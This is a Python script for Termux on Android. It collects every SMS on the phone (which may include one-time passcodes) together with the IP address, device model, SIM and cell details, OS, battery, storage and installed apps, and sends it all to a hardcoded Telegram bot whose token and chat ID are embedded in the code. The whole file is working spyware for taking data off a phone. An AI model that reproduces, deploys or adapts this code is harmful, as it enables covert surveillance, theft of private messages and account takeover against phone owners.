import os
import requests
import socket
import json

# Replace with your bot token and chat ID
TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
CHAT_ID = '6285177516'

# Function to send message to Telegram
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"Error sending message: {str(e)}")

# Function to gather SMS messages
def get_sms_messages():
    try:
        # Retrieve all SMS messages
        sms_list = os.popen('termux-sms-list').read().strip()
        sms_json = json.loads(sms_list)
        sms_messages = []
        
        for sms in sms_json:
            address = sms.get('address', 'Unknown').replace('_', '\\_')  # Escape special characters for Markdown
            body = sms.get('body', 'No message').replace('_', '\\_')
            sms_messages.append(f"From: `{address}`\nMessage: {body}")
        
        if sms_messages:
            return "\n\n".join(sms_messages)
        else:
            return "No SMS messages found."
    except Exception as e:
        return f"Error getting SMS messages: {str(e)}"

# Function to gather device info
def get_device_info():
    try:
        # Get IP address
        ip_address = requests.get('https://api.ipify.org').text
        
        # Get device hostname
        device_name = socket.gethostname().replace('_', '\\_')  # Escape special characters for Markdown
        
        # Get mobile device name (Termux-specific)
        device_info = os.popen('termux-telephony-deviceinfo').read().strip()
        device_info_json = json.loads(device_info)
        mobile_name = device_info_json.get('manufacturer', 'Unknown') + " " + device_info_json.get('model', 'Unknown')

        # Get SIM info (Termux-specific command)
        sim_info = os.popen('termux-telephony-cellinfo').read().strip()

        # Get operator info (Termux-specific command)
        operator_info = os.popen('termux-telephony-deviceinfo').read().strip()

        # Get system info
        os_info = os.popen('uname -a').read().strip()

        # Get battery info
        battery_info = os.popen('termux-battery-status').read().strip()

        # Get storage info
        storage_info = os.popen('df -h /data').read().strip()

        # Get installed apps
        installed_apps = os.popen('pm list packages').read().strip().replace('package:', '').replace('\n', ', ')

        # Prepare message to send
        message = (
            f"*Device Info*\n"
            f"IP Address: `{ip_address}`\n"
            f"Device Name: `{device_name}`\n"
            f"Mobile: `{mobile_name}`\n"
            f"SIM Info: `{sim_info}`\n"
            f"Operator Info: `{operator_info}`\n"
            f"OS Info: `{os_info}`\n"
            f"Battery Info: `{battery_info}`\n"
            f"Storage Info: `{storage_info}`\n\n"
            f"*Installed Apps:*\n{installed_apps}\n\n"
        )

        return message

    except Exception as e:
        return f"Error getting device info: {str(e)}"

# Function to send all data (device info + SMS messages)
def send_all_info():
    try:
        # Get device info
        device_info = get_device_info()

        # Get SMS messages
        sms_messages = get_sms_messages()

        # Combine all information
        full_message = device_info + f"\n*SMS Messages:*\n{sms_messages}"

        # Send the collected info to Telegram
        send_to_telegram(full_message)

    except Exception as e:
        print(f"Error sending all information: {str(e)}")

if __name__ == "__main__":
    send_all_info()
